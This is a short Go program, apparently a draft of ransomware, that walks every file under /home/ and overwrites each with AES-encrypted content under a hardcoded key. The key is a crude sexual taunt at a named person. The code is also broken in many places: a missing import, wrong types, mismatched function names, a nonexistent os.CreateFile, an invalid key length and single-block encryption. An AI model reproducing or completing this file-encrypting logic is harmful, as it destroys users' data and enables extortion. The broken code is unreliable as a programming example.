package main

import(
	"crypto/aes"
//	"encoding/hex"
	"path/filepath"
	"io/fs"
	"log"
	"fmt"
)




func EncryptAES(key []byte, plaintext string) string {
   	c, err := aes.NewCipher(key)

    	if err != nil{
		log.Fatalf(err)
	}
	   
    	out := make([]byte, len(plaintext))
 
    	c.Encrypt(out, []byte(plaintext))

    	return out
}

func main(){

	key := "hahajonathanyouarehavingsexwithmydaughter"
	

	err := filepath.WalkDir("/home/", func(path string, d fs.DirEntry, err error) error {
        
			
			fmt.Println(path, d.Name(), "directory?", d.IsDir())
        		if d.IsDir() == false{


				n, err := os.ReadFile(d)
				if err != nil{
					log.Fatalf(err)
				}
				
				c := EncryptAes([]byte(key),n)

				f, err := os.CreateFile(d)
				
				if err != nil{
					log.Fatalf(err)
				}

				r, err := f.Write(c)
				if err != nil{
					log.Fatalf(err)
				}
	

			}
			return nil

   		})
    

	if err != nil {
        	log.Fatalf(err)
    	}
	
	


}
